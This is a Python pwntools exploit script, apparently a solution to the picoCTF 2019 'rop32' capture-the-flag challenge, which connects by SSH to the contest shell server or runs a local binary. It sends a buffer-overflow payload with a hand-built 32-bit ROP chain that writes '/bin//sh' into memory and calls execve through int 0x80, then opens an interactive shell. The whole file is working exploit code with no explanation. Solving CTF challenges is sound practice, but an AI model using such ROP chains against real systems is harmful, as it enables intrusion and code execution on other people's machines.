from pwn import *
from struct import pack

e = ELF("./vuln")

context.binary = e.path

if "--remote" in sys.argv:
  s = ssh(host="2019shell1.picoctf.com", user="gamester543", password="")
  r = s.process("/problems/rop32_3_b5305a898147ab65734ad8490af4265f/vuln")
else:
  r = process(e.path,
  )
  #{"LD_PRELOAD": libc.path})

p = ''

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x0809f46a) # pop eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80

r.sendline("A" * 0x18 + "A" * 4 + p)

r.interactive()
